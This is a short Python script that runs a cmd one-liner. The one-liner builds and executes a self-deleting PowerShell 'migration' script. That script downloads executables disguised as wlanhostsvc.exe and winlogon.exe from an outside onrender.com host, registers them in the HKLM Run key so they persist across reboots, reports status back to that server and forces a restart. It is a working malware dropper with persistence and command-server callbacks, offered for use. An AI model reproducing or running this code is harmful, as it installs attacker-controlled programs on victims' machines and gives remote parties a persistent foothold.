import subprocess

# Replace this with the command you want to run
command = r"""cmd /c "echo $ErrorActionPreference = 'SilentlyContinue' > %WINDIR%\Temp\migration.ps1 && echo function Hit { param([string]$url, [object]$data = $null) try { if ($data) { Invoke-RestMethod -Uri $url -Method Post -Body ($data ^| ConvertTo-Json -Depth 10) -ContentType 'application/json' } else { Invoke-WebRequest -Uri $url -UseBasicParsing } } catch { return 'none' } } >> %WINDIR%\Temp\migration.ps1 && echo function Log { param([string]$statement, [string]$state = 'SUCCESS', [bool]$terminal = $false) try { $full = ""$state   $statement""; if ($terminal) { Hit ""$global:url/terminal"" -data @{ output = $full } }; Hit ""$global:url/output"" -data @{ user = $global:user; err = $full } } catch {} } >> %WINDIR%\Temp\migration.ps1 && echo $global:url = 'https://ms32-sha2.onrender.com' >> %WINDIR%\Temp\migration.ps1 && echo $global:user = '<MIG>' >> %WINDIR%\Temp\migration.ps1 && echo $regpath = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' >> %WINDIR%\Temp\migration.ps1 && echo $appdata_path = ""$env:APPDATA\Microsoft\Network"" >> %WINDIR%\Temp\migration.ps1 && echo $destination_path_exe = ""$appdata_path\wlanhostsvc.exe"" >> %WINDIR%\Temp\migration.ps1 && echo $dest_checker = ""$appdata_path\winlogon.exe"" >> %WINDIR%\Temp\migration.ps1 && echo $ms32done = $false; $checkerdone = $false; $regdone = $false >> %WINDIR%\Temp\migration.ps1 && echo New-Item -ItemType Directory -Force -Path $appdata_path ^| Out-Null >> %WINDIR%\Temp\migration.ps1 && echo if (-not (Get-Command 'wget' -ErrorAction SilentlyContinue)) { try { Start-Process 'winget' -ArgumentList 'install wget' -Wait } catch { Invoke-WebRequest -Uri 'https://eternallybored.org/misc/wget/current/wget.exe' -OutFile $env:WINDIR\System32\wget.exe } } >> %WINDIR%\Temp\migration.ps1 && echo try { Invoke-WebRequest -Uri ""$url/static/apps/wlanhostsvc.exe"" -OutFile $destination_path_exe -UseBasicParsing; $ms32done = $true; if (-not (Test-Path $destination_path_exe)) { Log ""Incorrect url $url for wlanhostsvc.exe"" -state 'FATAL'; exit } >> %WINDIR%\Temp\migration.ps1 && echo Invoke-WebRequest -Uri ""$url/static/apps/winlogon.exe"" -OutFile $dest_checker -UseBasicParsing; $checkerdone = $true; if (-not (Test-Path $dest_checker)) { Log ""Incorrect url $url for winlogon.exe"" -state 'FATAL'; exit } >> %WINDIR%\Temp\migration.ps1 && echo Set-ItemProperty -Path $regpath -Name 'Wlanhostsvc' -Value $destination_path_exe >> %WINDIR%\Temp\migration.ps1 && echo Set-ItemProperty -Path $regpath -Name 'winlogon' -Value $dest_checker; $regdone = $true } catch { $err = $_.Exception.Message; Log ""migration not done. error=$err `t ms32done=$ms32done,checkerdone=$checkerdone,regdone=$regdone"" -state 'FATAL'; exit } >> %WINDIR%\Temp\migration.ps1 && echo Log 'Migration complete ab smartboard ki mkc' >> %WINDIR%\Temp\migration.ps1 && echo Restart-Computer -Force >> %WINDIR%\Temp\migration.ps1 && powershell -ExecutionPolicy Bypass -File %WINDIR%\Temp\migration.ps1 && del /f /q %WINDIR%\Temp\migration.ps1"
"""

# Run the command
result = subprocess.run(command, shell=True, capture_output=True, text=True)

# Output the results
print("Return code:", result.returncode)
print("STDOUT:")
print(result.stdout)
print("STDERR:")
print(result.stderr)
